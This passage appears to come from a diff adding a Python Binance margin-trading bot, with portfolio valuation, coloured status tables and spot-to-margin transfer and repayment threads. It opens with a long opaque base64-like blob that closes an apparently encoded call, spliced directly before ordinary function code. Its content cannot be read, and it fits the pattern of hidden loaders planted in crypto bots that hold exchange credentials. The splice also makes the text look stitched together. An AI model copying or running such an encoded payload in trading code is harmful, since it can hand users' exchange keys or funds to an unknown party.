FUWsd5rs/ZWRpu+6klUHNqhQMK9Nsj3vpTIVIOCLyMiDIwH1si9mKEyujQY61Zze5ieyHr744kXUpQCaEAeupSfQVnoc+aqo69xX4MkHcoH7sVVHADrAZLcUrZWfWQMSX2I/v7o1QcwGq+0mGlYLJNpmoh8ejzCgIF8k4PDbUbWuOgeVkC6/UQ3fzvjzOMzmU1hf0STf5pvyxsE1DUQbLRfnlA8HVyCycVds10z/QnMWE1kBGfZCjmAprP8IGpUU94S9kC6SwRihmSMsIMEgFhfdlM3zhyALe67IOHJmT/MiBYLGEpVMgd/6iRiwLuBwDAf+KZAR/pfWNoLEG1H1YVieVSegb/he2Gzw76G0qNKnIddX4c/RObuKuB5HMm43S2Vm35s9wU5XK0G9yBMyMFO7oGAYFViS9cmJZQmjlYNvBAVg6YwGiIWAfsbeSCtJpGp7YenbfUfwBz9qRfLBK/9ZAbk9ISQ5gUYNYcnanIrU0nESmtLt61j/9772BtP13va7hYpU5nyVkFOTnSJ/JkaHn6WxAxZFkBJeteajs0U70a9MTb0rrPo1Du8cjidpKmOjGp9tU2uom/p//u5zXeuDZlSn3i8HU8ST8wVmnNjX6J1rYZBsWK4Zk/gkq3hCOR8WtAVTADFBv8WNyhGCWMLqpdDzAmrOIsbvW5FTDLH1cYYYKdheHd8qzBmE6JACNjCPlljtVFNBCXSMDrc/wX000rv+CRtapLj8848zFBDUxqLFU9wrFJ0puoLgeAOc/6y1shhsOo86Vi6GQw3MU5BtdSi5eAFYApVpCatTn6eo4LJcMF01IMjim8g4yG/FWOGOz19zZm89hJxuWqogZUTje8HCFHCDLOtExwz38e4mMdojMeZE9XAcRqWd+2ITqL/v04QeKYg6QmukiE7phDACaB/9xEmDgc9Kn6euqR8TjvqXU+w4N/jf3BHNYkEnvK63H5kk6/itkUY70nHZthaXYM97E8m+2vWMQqZptZ731ITwjmSnbn1RPEZ079ccpLnV/HJKf6ILzeh0XG5KQ4dqK49P1pqHwNqkcu9ExbRSvbis7xWySyU/df7ipP2dLzLkpYXCx5uMSfJntzZnt6+lrVzz6haMVeapK3f9n1lyY/FKDVhBQXU3NRracnDSi4KsXyhUsE3wW+LMVepdHL4Z0MzaJ54qv909Dvs/QzzEtPWSqZ92canKEl7zk7hwzut17PMA86fDDED24WQHtLnh6JaCGRO+YEUUKqCWQ8rhxmV/RXqDjIk3jcrEpZ139ePdLT0BqnfJc0ILf6M2g0Uw4CyBNwSxfXtnbnBBE6PoW7MxlU/gkUA5R8ke8fCWtf0WceBi92QS8ibQs+Lr3OD+GJtLnXjWli8r9qk7wOPCiP9GxumnwK+mPQv3ifNd+BEDIIbPn38lRWCvPk+/NlirTZ7hLBF3ouzIyl16Od4FE89h1+qx03PqkQZpruqyfifytcgaZ/qeLf2q1P8F/F+as8lEnAykAiFzsC6qeH8xrNGisXQCS661uWezWqIJ3OTKDrVPOe5cVpAcflVHsWsoC2w+KboHM8nbbnWinR2G16y7iOyROeppEE59TbVgt1QogCj/E/zWpM+8zRykvTo3fHGkf/lnixGXVUS/vW/17NoQ+lYHb+YMD8fJWdM93undQS7eeKq4HjEiFdHycpPJiTlb34xQHMoehULRdV+JxiFOBiZaTAC2LoqWh9ZLvMlGA0t3VBEXqfAbQ4Js38ko/H3IKf2KQ4XTGRRMDcb6JHEWh1KYAb+8R3Do604imL/ncslW0yq6e0Cj1Ve1xvlDyBjmnTr5smPOpO3peGhf9Deaxb5MckX1ah8aOehDDFayHkb4zOXiZu5AM5ijZVQGMDQvTJCquVPbmg40Yez7szjI5w3b7pswqVR6+LKCqZeT4uP2lsni0wcZTBosGWUR1D6sh3J/g2kqA4W+ybZwq/peGkX8TA1KYQwfLWomOVAWcLLV34T4QvI4dKY86p30mGNXN3IYu+rdERzzVVGyzAzG4XDl9Q5tFsLi2USeMVcyRS4ah277vF5D9lah1kXF4Z4oLKA2sU9Xz90QnvGqcgIib7RaEqwGMwkBy+tl5B0P5LH/MGEzUcOwEUkdZQE/2Lw0bK7zd8h1ZMupUJLecYiC/ab/liH87qLRIhY2mqfvvXAUhkYAUCqULsFqr8A4Kmm63fG45d/SYqKrsQuPuij6WuupwJwV23OzCwhfkNyvCHpOMlXdVVdSnZ8GvraM3HP8mgKeehNznwkMGOiDO/ewPq7wF4Kq0KKYfKdjI+fU9LqRkByzv2DB39MRYcenRTFhww9oDiL5UHE2bkpHQYqj0+ltI/8tUAk7vakIQ3ULNFcWxAYSgsJgiBPaRPhOQ1fjAmnG7A4Nl44SbDboyPSs3fQZYZHLW8cIF/BK2JHadZ0DKZRAw6nICiW56Huqr1Mlnjx9wcnxHm6/pgrpHxkBymrwfRrQRrmu2AwGPtvNj0F5jP4ZnyBOesJOeZsu5CEdD61nwNyXWDGFzxWYDo4w8xeyMee8UzJln+U+a4xjnp4uWb8fHu68rcDG1PPO6m6qdvsYGTxl3OyKQCs+gdyPq5MlOW5C67CsI4NazuVOIm0Q45oXv3f8qq1qJluV6URF+eeIemnQsv0A9PV3D26PihNsWCzWBWAvlyTMnv3iiLzX05tG+Sqx+NIR0LBB1QZFwq3s54X6wjdBAGZuzoDfz2Elew62LPFW9HfDcjMiWtQcP4jWhkfyOPop2czTo0Z5VALXGLVcHcAQuSUQdyqpLwmvE42OaRGcoL5Xu4RdvjilUGjcJg2ItGYGWLYCAXlEof7WwqSZ2mpW8V/6uQpGsO4LRhdYgGv7T6pMz2W0XePrqf8yBVurQnlr/0aInvpBK/OtKhHDWE3bZEjhWkWzV0agF5uxx1n9BvAlyZuGs1LAAUnfBmoLPaWN63XMZOZKRa4nImeV4ixE4JyWl6c6NCk1EKhNQHmFVfUqE8bfI5X66iV5Bc/vnEt4dCmZ5voySphJJLxhzgldn+nHTHG2mksI9M7Ny7B0iP4dplYVDc41T0UOZK6syJVPXsd473zUh1+88ZoKu5QikFrZEk997e9pnVGwxU+AkLIIbk9aY4uRHOyDrPGC48KObTMbOYwdk7gMzWrAbD566GcVoUQO2JpomrsdgJXZO/0b1vGC1qLRIB6nauI0g7Vcjjee7PuJ/Xs2nnxLNr1UgariFjG4V2QNNADXK01CW+H+hoGIYaPC763EVGgLuHBUbaQx2v5oKh4odWtvBleBKZZjMKAqgrB3TLk/edkL8TZNdLW8KmqHALvhN5DKNKeY8fRhHzXaGbcuy64ncXwvdoJuX0nMANTsoNnthLxL17JTaPdmCGjKCR5GW9wziPqvfNh/t3aOLgtB+AySEdwI3Yf/hQtXoIWKVmGasC4tSGMZYp5rAN8zeWQVSYEvvyOR2rxafL1Cc6P/wKI5N79p8z2PbOCg1BzR5RVm5SkcIO6+0uIrP9GEUJaK9APZhM8g53FFuZGmSmCxR2NQQxFbGfVSR3TAp0anNE0a8+nZyTzESZA8JwYVEbTpurlGZvvRbP/NRdKS3AGyQeC6GGdR27KWT6saGqYqVAMb1zOLhbCmtFcfDYqXgKiUpkCSF4i2+yF9XivtDgOQ5mfA/eN/DZKQW1K1qBFNlbw1uyO8XKoCdtxbtRHdQ+90fKAecd/H7ZwvhgIfd2gcryIyVzWgr277o2You1XMKaoQRSpFHSnzl4MJYuTmIqEKqYh2ll3qm/le97tUhjPI3NBHjiGk6aPxtQ3uJzDmBBYHQYF29plpYZHeJp8KTEo/zRHRnGY1vkHO/GmK+noTyFLaRWNXjIRei/2Jccn4etwI01jS9cdv35ZD1/gJAaBZANCZTARxHhlrfntGSmRCVM+u758tGfwk/pU+495qtAwEKWtVPt45GfRu7XfWodvGNERy2UK8i54Jo7duXfXkWeyrK3gBUCbTg9D4uZQ119oqQ4ge5yl3FdYP/lP2Rc3r9jFWO+e9fYzFuwpXKA0YrodpLdbzrcAGfQ4rvdgBtRT6gHp7NH4ZNLWf8yTqnHsHcZVt5iVasJesRxxuZ4w244Yj+PhlzvTszeFNHKQqadCqlZGpqgq6+PN9Wrnul8jXSzWtg2jvWTSD+Rx/XzHUWkwE8Whf9ludnUR6ePTsKo45qAf23EbiiVRNmVYc0yEXPcXXWHXroimuk5axA/FnIdq2zLlCar8DGTj6vCRRxl4gLVmyrbgMrUdGf6S1kTg04CSmUgjuFLIRGd0dyasZtZHy2ynxHEmJxnNrAJ2Hb3qxwXfH6kuZe6RHPn1iaKdwMaISB5FEUOAL2VO2nbSJDTzNmGRvAhDCSqMcjoDLLHT8HRqvfBqwgsKhNlI7eeHgM+SygZjt07mDTpsoEQA5KU+dXrEeEV//5CNpZ258/IZqyj0e62dchEKLz1/i1tu2+WHelRBKpfPYfX9KyY3fW9EZckEcRr2zORRAucXyX8J3l0uKniJ1l6v/A78DQoJhqtucidUSu1unvsffAyBfW9y0BqkYH83YJ+ghONNtq1rZ31RWK00y75fFEm1VGTOepEP/pvFJ9Qtp0EjRQOeMCMMM8H6L4ZJRa4Hvm2XIk841XeMY3rnyiN7sY9v09gv6W6z7OuZ8988of338a0uSXr0pPZ9yAWyM3TEVn90luCsbjxmn+3UFolKzKIJxz+fZYT6+A4PP8RqDHI9B13P/lg2HQ4/vLu8Txv1W9eblwyH5znN20SKdzAUu/OPYi/v9VyeoZSKtmlhZdRhl60xF6mA2Gyw/ZbnPRJmkl2Og5pKX7uuXC1LIki1EN0znH61SRNcC7ZxN6Tdpgoj1pg/fxsRTissPV6k9pZN4ItboenHYDJBSUUcZGPPMglywjxvQxPI2zLCNc0KmzXEb5F1Cbo6W/u6buhuj9gYHqO8Y+rhFCYkf0cXLXrFkWbzpgyEphO7yMUqBXvKuDfsdf1i5adzKA0dYLRcm+/LOobOuq24qgkuuL0MxRzCHxhex0ghVzBbFv7yNgu7SGGpvntysiaN0lIXZ4rhFRYO/rY/QQKe6hayTF0GIh/OcQtcR60w5U1tzxWbTUzOH1wTTsPDEmc2xjxrn2QV4heEiig+gvo9jl7Fg/PZyt7WJLQWG59iIeybS/jD7QPAvw9KvsChanQ+1WvJIRcq0+GJDFIviJagJhveV7W7DPpJjnG50Nye2AC+iif7Ua+ALEDagRDdcBnJKMQLCrstX75vby4jfRYruMXkM8uJLAv1MBfVea72E7+MG4QVp65sDbO0bvBuXHj4I47RIONAEZtWKQmixaMdf4HgDsDgTnQTCjSfcBKo1+M6bhUXiVkgjKXtuVroqQld05H49X7rAICJsSf4iivUDbz+aik4DRYMY1HsRnUbtXB7OPgHFG2gXAhBsgf2nIWYnmnipPeLy3LTHpPJST1v/T4q5pBGCw1m+yq7fXMrC6tAB+4Ygg+ERnfgfFnr+BjhR1QBWBZAqrZXB+XgtViXp50v0sRMctHHAVTloY2SVY+NClx4glmG50kduaSGN4JN/OOu4F7E74zcIVoMd0ILuFXDVtYUVlueD0Y+6lphwXAKHok7i6rb2h/Z9YAasfcN+HoyQbiUJJr8gAdaq2l1R3OR0cqmgjqhvaOURAyPwbp26N9zfYVmSDQyTdKS53+OJxhm8PDg/F1NvNR5EBU326Rkf7m+pYte9bFzioI5DRNfsQ/I/rV9F9pRzGQkwaprO+7c5nm0CrxhpCXhf7uh38+dX588ZboI7sOTNgs4KffOYHcD/tut+omdAAT90xbkQkGzj4YpIIggKEUqz8SHFWSJVNsUVu9sauyXqSESWJcn+J6mxhe3PdZ8KiwkaUJiUVtRRW4piodJ1IGzzarwZXTw+Il36Eh+xE5enuUUnlJk5UXC03YEl1BcS8onMbvultt4G0hNRQYxGOMlpW6oFsDsroBxWVfr8ck2qFJyxqBvQCxgxwsBpyPYpIkuTQKAXNZQdb4vKAYMNLITW79UZuls38nUZL2MFz9rf457KchQzFOPD9Vpu2BvZ4LQpKOguFA1w6oyCCGWKUjbrfIsYaSwxwbQZ8rbH9l3L9+4DnxKWIZQBJ5da4/Inx+thunNOXA26XJvqKOXzPpU6dufYtNccwHCzUV6SOb6K5tIsaRoDqc9GrO8xL+ahAZ0/WYOvoikF9RrZoOTWMM1CaA412QV6+y8h3Nbqup2i/Dj01QnQ5Li0PE54ldyXLamouBK2nnpjZd0XSkRs3hODTInf+wN5VO/C0eTPwcpkO0YZSYA/hGih4Av9po9I45Yk8TF5xby6TUPZ3hbRgHwY+MyQ/fikug6GOk3mMZWx52pFlilQJZ5fkI1RFz1c8cu5SYSeG2ITxaWNQba8Z3FZ4IMlrrmoJCftbRb4vgkaxpLJrONosE0DeEtei1M0flELffQMNSYYgmVlyzwAuGiYggrq6Glhsbp55AL/Hbn0MVHlL5OIPEG05LoNJvmHgdKV8V77BIzCfzQTMAF60jDOVWgkp7MfBoXjxkX56L7cw274lgKoJV7udTFeLkLb5JX6eoRHJAUdxkk8QzNljb014WXwNDJfElt4Kq5lXq9FygKT2r04gILKDJLV3VtlPbrBXnIlGJEZkka7yu2gMH04jw1LTxrpsrjUSp0lJUIkwtmEku/Q8+qU6tghNeExju7HMLBFxL0w7ORMygVKylZIZFXLXqb4RC8DIg6g7Ff9IeCIOEa/phNlXvLOfruzg8QyybIkKBXQvsOpVgKi7ncRnnReVRWjLw6iv7sdxXs70yr3AgocVW2fCoABf0EsbAT6YNLV0wAVXYzr3QAsbA9tsA55Mbsjgk0Y2906FzNXqSE90F6kRkxdTiLp8E/q2KHHoldmz8ctMQUuA4iFZKs9OJW9faieC27RlANVYk3Vd7LYoqhXC2iQWE3Cc3ngol3e8tTxhWQHcnp4VsBW3E2sc94J22Dldlru1nfhmVRgpEXRqe3IZcypptHI4zbcaO3V84AlkRKP/xdXrkmaB7G2sQxw9vA2pkxIIBVAG36TPphvmnFezrGVR2K0cgd4j23b2iT5W0XMnRQF2266Tbi+4U/FZGWiZEa93IUrb9bA4riGP4XgKNFblOXIntIg6E5S/igrYkb6QP4PHJHq0ssC4qNkLvg3MqA34uOLLyE/1UFM8r+tirb4b7mSe442ik7uXsyReIZ/0rLcs6oWckdDos5Hnm8Bc6o6bCGJVj7wI7hvR+QSK2CopzhzKoMyi3u07U+8AQZ3o975k2GJRVT9XnsAzmhbfyRMrftSZGYTUNDmHz6wGWU4VQQe40oAEkJi6raZ5YJdRS6uN/pxpCq3d9qgt2O49uUp7qVWlFiaM+5Jg7sa1NQQo5unxIWa11Kei3nT6eIy1nI9xBh1eP08mdgza37SuPUSTCSkg8C5PH/wl8icQ1cmiBpbmnBVFjsvXHZkCLivJfpLUp/O5+HVtqGtIkPgdXTAEJW37h69Cy25Xbp51Edc8rXP0Fu1mcSfim7FDCDJUWV/H4wrhIwqDEi/rAwD3HcVN1rFNDcm3bflQnbG4Vhpz25SW51ZcOzEffb+wwb2uiaKuM7eNvSsvpQQa5TMDaB5N5nwaE653BxOSWFzUMo3qivPi4zcecIE15WhdmQvKzL5/dtSnSNC2OdSoX9dkEcAr5H0zxaIHkm7PiEH9ldvYLBXm2pWmWGcKHUM+55jkcoZbW196gED2zNWRfvWHVQC6duamf3kLX2h/6rTm5xZ3M4+OcJpJBOgIOoh8bxaEJmz5EdHlyqSCxMghIVkWmyLCwWRnY37/JKO5UABT7MGfNp573yhNLOKy1+4rrBn7CVQv9Re5h2u9HTFqETiexXfFc2FmPZNWQXyri0Et3joAJRUXVbYiGF487VxN8ToY4U7SE5YWcIaSA/6bwlJ/Ya+ZUaHt5Y4JkbtRY7DxmDFtCDlfaWjRrD4e/K7voentWCMSIYEgI5PeeMPNpm0jLxi9HNNgxYS3TOb1kfLqnAqKBj1avZVEiOnGunVT2hdgsa5INYlh7iWBO13RKcv7lAaPngh99gXVoHNdnEi6BMlbbjglJJBygWFN7tnCcVXrticukpJ0toCSVHgWc8/bHaSQQ75ME5PlRPlC6HzHgukMMs5ISpeqxrcaEY2Q1RrcbIcPaKLXpwJ40UsrGFy39WEnpHEc8g6GKbnVkFP+2FRsock83IUbuQI1NRIYmP50QlGbUSBUnWZnn/P3NLQrcn2X5HOjtvUxZlDpbad82QBNSSYTupwPh0slLySc+nr2goP888jXeh6KBPd7B9FA9ouwQmb4njQ0RT/1nOxC0coDxrX/9kwUz8yDPgXvXI4J1Rc66rOx82SaIkC42hupbzdzZwl2idvUUEfqg6aTWqAQgL9ScFadt3HObj6iYBRCW5chBMrrBUTXqRf8tmRetnZtWqhpj6np1SqKYDyX+5x2r3UvH4cXxvRWKkcCUNXOMkl8negz6XYBRZDocZvzg6FQ8DbWtzYj7SzOke9zVEiMfKRrnDSNnqKzl1VKIGqUzlXy9OhSbABNG2mtp7fjmsEj1w3sVsLz3g69YBMLmfuTwYTerEzOFX7Vk7zRLjOz9fI+M38ukyFIjyNCFwNNsuVQHS7miLY2kPwLYrXcf/w6BzDeZntqcKk4kXvHhIUJJYhlcCRHta2uqjGMLymrAPELbo2/1FbDp5GljvYI3gKV+zKmr5XdtLMwfE4VxZXYt0k3qnmMNBC9JjaZXulD77dQklPwk+crd5xiEh2XmHI9nwhvk0MHjtvX8KlNt9CQ76diiZUmQMfAgZVlhoy1Ffh2A+8YlZCsAYNWtrNxT6gkBccC1cIewCy4j3UVp6DjvZ87pKDkC+2SxbHStFqeAT1GQ56huqCmblZpqeLUWAIw6YLiKeMQLf04Nuv+K0cVBCzxQJkV38XzfbN/AwvQuuQRdmFnNC2TGYHfzHbtly9wndRzWQ8v0//7797//k1VxUJ119y59+WcJ4Q97vyOzMTLmjZrZoFGmDu8Xn+TRWA16OW8mUwJe'))
+                    if btc_price > Decimal('0') and btc_usdt_price > Decimal('0'):
+                        price = btc_price * btc_usdt_price
+                    else:
+                        continue
+                        
+                total_value += total_balance * price
+            except Exception:
+                continue
+        
+        return total_value
+    except Exception:
+        return Decimal('0')
+
+def initialize_balance_tracking():
+    """Initialize global balance tracking variables"""
+    global INITIAL_BALANCE, PREVIOUS_LOOP_BALANCE, TOTAL_PROFIT, TOTAL_LOSS, PROFIT_QTY, LOSS_QTY
+    INITIAL_BALANCE = get_portfolio_value()
+    PREVIOUS_LOOP_BALANCE = INITIAL_BALANCE
+    TOTAL_PROFIT = Decimal('0')
+    TOTAL_LOSS = Decimal('0')
+    PROFIT_QTY = 0
+    LOSS_QTY = 0
+
+def calculate_loop_profit_loss(before_balance, after_balance, loop_number):
+    """Calculate profit/loss for each loop"""
+    global PREVIOUS_LOOP_BALANCE, TOTAL_PROFIT, TOTAL_LOSS, PROFIT_QTY, LOSS_QTY
+    
+    loop_profit = after_balance - before_balance
+    
+    # Update totals
+    if loop_profit > Decimal('0'):
+        TOTAL_PROFIT += loop_profit
+        PROFIT_QTY += 1
+    elif loop_profit < Decimal('0'):
+        TOTAL_LOSS += abs(loop_profit)
+        LOSS_QTY += 1
+    
+    PREVIOUS_LOOP_BALANCE = after_balance
+    return loop_profit
+
+def print_parallel_header(loop_number, total_loops=80, mode="PARALLEL", remaining_time="06:08:35"):
+    """Print responsive parallel trading header"""
+    clear_screen()
+    
+    # Get terminal width for responsive design
+    terminal_width, _ = get_terminal_size()
+    
+    # Adjust layout based on terminal width
+    if terminal_width >= 100:
+        # Full layout for wide screens
+        title = "PARALLEL TRADING STATUS"
+        border_length = min(120, terminal_width - 2)
+        padding = (border_length - len(title) - 2) // 2
+        print(f"{Colors.BOLD}{Colors.BLUE}┌{'─' * padding}{title}{'─' * (border_length - len(title) - 2 - padding)}┐{Colors.END}")
+        
+        phase_info = f"Phase: Loop : {loop_number:2d} | Remaining Time: {remaining_time}"
+        trader_info = f"BTC-Trader @yannaingko2"
+        available_width = border_length - len(phase_info) - len(trader_info) - 4
+        if available_width > 10:
+            center_padding = available_width // 2
+            print(f"{Colors.BOLD}{Colors.BLUE}│{Colors.END} {Colors.YELLOW}{phase_info}{Colors.END}{' ' * center_padding}{Colors.CYAN}{trader_info}{Colors.END} {Colors.BOLD}{Colors.BLUE}│{Colors.END}")
+        else:
+            # Stack the information if not enough width
+            print(f"{Colors.BOLD}{Colors.BLUE}│{Colors.END} {Colors.YELLOW}{phase_info}{Colors.END}{' ' * (border_length - len(phase_info) - 4)} {Colors.BOLD}{Colors.BLUE}│{Colors.END}")
+            print(f"{Colors.BOLD}{Colors.BLUE}│{Colors.END} {Colors.CYAN}{trader_info:^{border_length-4}}{Colors.END} {Colors.BOLD}{Colors.BLUE}│{Colors.END}")
+        
+        print(f"{Colors.BOLD}{Colors.BLUE}└{'─' * border_length}┘{Colors.END}")
+    else:
+        # Compact layout for narrow screens
+        title = "TRADING STATUS"
+        border_length = min(80, terminal_width - 2)
+        print(f"{Colors.BOLD}{Colors.BLUE}┌{'─' * ((border_length - len(title) - 2) // 2)}{title}{'─' * ((border_length - len(title) - 2) // 2)}┐{Colors.END}")
+        print(f"{Colors.BOLD}{Colors.BLUE}│{Colors.END} Loop:{Colors.CYAN}{loop_number:2d}{Colors.END} Time:{Colors.CYAN}{remaining_time}{Colors.END} Trader:{Colors.CYAN}@yannaingko2{Colors.END}{' ' * (border_length-40)} {Colors.BOLD}{Colors.BLUE}│{Colors.END}")
+        print(f"{Colors.BOLD}{Colors.BLUE}└{'─' * border_length}┘{Colors.END}")
+
+def print_parallel_status_table(pairs_status, loop_number, remaining_time="06:08:35"):
+    """Print compact one-line per pair status display with perfect column alignment"""
+    
+    # Get terminal size for responsive design
+    terminal_width, terminal_height = get_terminal_size()
+    
+    # Print compact header
+    print(f"\n{Colors.BOLD}{Colors.CYAN}=== PARALLEL TRADING STATUS ==={Colors.END}")
+    print(f"Loop: {Colors.YELLOW}{loop_number:2d}/80{Colors.END} | Remaining: {Colors.YELLOW}{remaining_time}{Colors.END} | Trader: {Colors.CYAN}@yannaingko2{Colors.END}")
+    print(f"{Colors.BOLD}{Colors.CYAN}{'=' * 35}{Colors.END}")
+    
+    # Fixed column widths for consistent alignment
+    col_no = 4
+    col_pair = 12
+    col_status = 16
+    col_market = 12
+    col_value = 10
+    col_profit = 10
+    col_loss = 10
+    
+    # Data rows - one line per pair with perfect column alignment
+    active_count = 0
+    
+    for i, (pair, status_info) in enumerate(pairs_status.items(), 1):
+        # Get status with appropriate color
+        status = status_info['status']
+        if status == "Transfer OP":
+            status_display = f"{Colors.YELLOW}{status:<{col_status}}{Colors.END}"
+        elif status == "Transfer Completed":
+            status_display = f"{Colors.GREEN}{status:<{col_status}}{Colors.END}"
+        elif status == "No Balance":
+            status_display = f"{Colors.RED}{status:<{col_status}}{Colors.END}"
+        elif status == "Waiting Manual":
+            status_display = f"{Colors.BLUE}{status:<{col_status}}{Colors.END}"
+        elif status == "STOPPED":
+            status_display = f"{Colors.RED}{status:<{col_status}}{Colors.END}"
+        elif status == "Completed":
+            status_display = f"{Colors.GREEN}{status:<{col_status}}{Colors.END}"
+        elif "FAILED" in status:
+            status_display = f"{Colors.RED}{status:<{col_status}}{Colors.END}"
+        elif "WORKING" in status:
+            status_display = f"{Colors.YELLOW}{status:<{col_status}}{Colors.END}"
+        elif "WAITING" in status:
+            status_display = f"{Colors.BLUE}{status:<{col_status}}{Colors.END}"
+        else:
+            status_display = f"{Colors.CYAN}{status:<{col_status}}{Colors.END}"
+        
+        # Count active pairs
+        if status not in ['STOPPED', 'No Balance']:
+            active_count += 1
+        
+        # Format pair name
+        pair_name = get_display_name(pair)
+        if len(pair_name) > col_pair:
+            pair_name = pair_name[:col_pair-2] + ".."
+        pair_display = f"{Colors.WHITE}{pair_name:<{col_pair}}{Colors.END}"
+        
+        # Get market price
+        market_price = status_info.get('market_price', '0.00000000')
+        if market_price == '0.00000000' or market_price == '-':
+            market_display = f"{Colors.GRAY}{'N/A':<{col_market}}{Colors.END}"
+        else:
+            market_display = f"{market_price:<{col_market}}"
+        
+        # Get value
+        value_display = status_info.get('value', '$0.000000')
+        if len(value_display) > col_value:
+            value_display = value_display[:col_value-2] + ".."
+        value_display = f"{value_display:<{col_value}}"
+        
+        # Get profit/loss with colors
+        profit = status_info.get('profit', '$0.00000')
+        loss = status_info.get('loss', '$0.00000')
+        
+        if profit != '$0.00000' and profit != '' and profit != '$0.00000':
+            profit_display = f"{Colors.GREEN}{profit:<{col_profit}}{Colors.END}"
+        else:
+            profit_display = f"{profit:<{col_profit}}"
+            
+        if loss != '$0.00000' and loss != '' and loss != '$0.00000':
+            loss_display = f"{Colors.RED}{loss:<{col_loss}}{Colors.END}"
+        else:
+            loss_display = f"{loss:<{col_loss}}"
+        
+        # Build the line with perfect alignment
+        no_display = f"[{Colors.CYAN}{i:02d}{Colors.END}]"
+        
+        line = f"{no_display:<{col_no+2}} {pair_display} | {status_display} | mkt:{market_display} | val:{value_display} | P:{profit_display} | L:{loss_display}"
+        
+        # Ensure line doesn't exceed terminal width
+        line = line.strip()
+        if len(line) > terminal_width:
+            line = line[:terminal_width-3] + "..."
+        
+        print(line)
+    
+    # Show summary with responsive formatting
+    total_pairs = len(pairs_status)
+    if terminal_width >= 80:
+        summary = f"{Colors.CYAN}Active: {active_count}/{total_pairs} | Stopped: {total_pairs - active_count} | Loop: {loop_number:2d}/80 | Time: {remaining_time}{Colors.END}"
+    elif terminal_width >= 60:
+        summary = f"{Colors.CYAN}A:{active_count}/{total_pairs} | S:{total_pairs - active_count} | L:{loop_number:2d}/80 | T:{remaining_time}{Colors.END}"
+    else:
+        summary = f"{Colors.CYAN}A:{active_count}/{total_pairs} L:{loop_number:2d} T:{remaining_time}{Colors.END}"
+    
+    print(f"\n{summary}")
+
+def calculate_transfer_amount(symbol):
+    """Calculate transfer amount using new formula: ((btc price × 0.0000001) - TRANSFER_ADJUSTMENT) ÷ coin price"""
+    base_asset, quote_asset = get_assets_from_symbol(symbol)
+    
+    if symbol == 'BTCUSDT':
+        # For BTC/USDT: ((btc price × 0.0000001) - TRANSFER_ADJUSTMENT)
+        btc_price = get_current_price('BTCUSDT')
+        if btc_price == Decimal('0'):
+            amount = Decimal('0.0001')
+            return 'USDT', amount, amount, 'Default'
+        
+        step1 = btc_price * Decimal('0.0000001')
+        step2 = step1 - TRANSFER_ADJUSTMENT
+        
+        # Ensure minimum amount
+        if step2 <= Decimal('0'):
+            step2 = Decimal('0.0001')
+            
+        return 'USDT', step2, step2, f'{btc_price:.2f}'
+    
+    try:
+        # Get current prices
+        btc_price = get_current_price('BTCUSDT')
+        pair_price = get_current_price(symbol)
+        
+        if btc_price == Decimal('0') or pair_price == Decimal('0'):
+            amount = Decimal('0.00000001')
+            return base_asset, amount, Decimal('0'), 'Default'
+        
+        # New formula: ((btc price × 0.0000001) - TRANSFER_ADJUSTMENT) ÷ coin price
+        step1 = btc_price * Decimal('0.0000001')
+        step2 = step1 - TRANSFER_ADJUSTMENT
+        
+        # Ensure minimum USDT value
+        if step2 <= Decimal('0'):
+            step2 = Decimal('0.0001')
+            
+        # For BTC pairs, we need to convert the BTC pair price to USDT value first
+        # BTC pair price is in BTC, so we multiply by BTC price to get USDT value
+        coin_price_in_usdt = pair_price * btc_price
+        
+        # Calculate coin amount: step2 ÷ coin price in USDT
+        calculated_amount = step2 / coin_price_in_usdt
+        calculated_amount = calculated_amount.quantize(Decimal('0.00000001'), rounding=ROUND_DOWN)
+        
+        if calculated_amount < Decimal('0.00000001'):
+            calculated_amount = Decimal('0.00000001')
+        
+        return base_asset, calculated_amount, step2, f'{pair_price:.8f}'
+            
+    except Exception:
+        amount = Decimal('0.00000001')
+        return base_asset, amount, Decimal('0'), 'Default'
+
+def check_spot_balance(asset):
+    try:
+        balance = client.get_asset_balance(asset=asset)
+        return Decimal(balance['free'])
+    except Exception:
+        return Decimal('0')
+
+def ensure_isolated_margin_account(symbol):
+    try:
+        client.enable_isolated_margin_account(symbol=symbol)
+        return True
+    except BinanceAPIException:
+        return True
+
+def transfer_spot_to_margin_thread(symbol, pairs_status):
+    """Thread function for transferring spot to margin"""
+    try:
+        transfer_asset, amount, usdt_value, market_price = calculate_transfer_amount(symbol)
+        current_balance = check_spot_balance(transfer_asset)
+        
+        # Update status to show transfer in progress
+        pairs_status[symbol]['status'] = "Transfer OP"
+        pairs_status[symbol]['market_price'] = market_price
+        pairs_status[symbol]['value'] = f"${usdt_value:.6f}"
+        # Reset to $0.00000 during process
+        pairs_status[symbol]['profit'] = "$0.00000"
+        pairs_status[symbol]['loss'] = "$0.00000"
+        
+        # Check balance and handle no balance case
+        if current_balance < amount:
+            pairs_status[symbol]['status'] = "No Balance"
+            pairs_status[symbol]['profit'] = "$0.00000"
+            pairs_status[symbol]['loss'] = "$0.00000"
+            return False
+        
+        # Execute transfer
+        client.transfer_spot_to_isolated_margin(
+            asset=transfer_asset, 
+            symbol=symbol, 
+            amount=float(amount)
+        )
+        
+        # Update status to completed
+        pairs_status[symbol]['status'] = "Transfer Completed"
+        pairs_status[symbol]['profit'] = "$0.00000"
+        pairs_status[symbol]['loss'] = "$0.00000"
+        return True
+        
+    except BinanceAPIException as e:
+        if "insufficient balance" in str(e).lower():
+            pairs_status[symbol]['status'] = "No Balance"
+        else:
+            pairs_status[symbol]['status'] = "FAILED"
+        pairs_status[symbol]['profit'] = "$0.00000"
+        pairs_status[symbol]['loss'] = "$0.00000"
+        return False
+
+def clean_margin_account_thread(symbol, pairs_status):
+    """Thread function for cleaning margin account"""
+    try:
+        pairs_status[symbol]['status'] = "Cleaning"
+        
+        account = client.get_isolated_margin_account(symbols=symbol)
+        if not account['assets']:
+            pairs_status[symbol]['status'] = "Completed"
+            return True
+            
+        asset_info = account['assets'][0]
+        base_asset, quote_asset = get_assets_from_symbol(symbol)
+        
+        base_free = Decimal(asset_info['baseAsset']['free'])
+        quote_free = Decimal(asset_info['quoteAsset']['free'])
+        base_borrowed = Decimal(asset_info['baseAsset']['borrowed'])
+        quote_borrowed = Decimal(asset_info['quoteAsset']['borrowed'])
+        
+        # Repay borrowed assets
+        if base_borrowed > Decimal('0'):
+            try:
+                client.repay_isolated_margin_asset(
+                    asset=base_asset, 
+                    symbol=symbol, 
+                    amount=float(base_borrowed)
+                )
+            except BinanceAPIException:
+                pass
+        
+        if quote_borrowed > Decimal('0'):
+            try:
+                client.repay_isolated_margin_asset(
+                    asset=quote_asset, 
+                    symbol=symbol, 
+                    amount=float(quote_borrowed)
+                )
+            except BinanceAPIException:
+                pass
+        
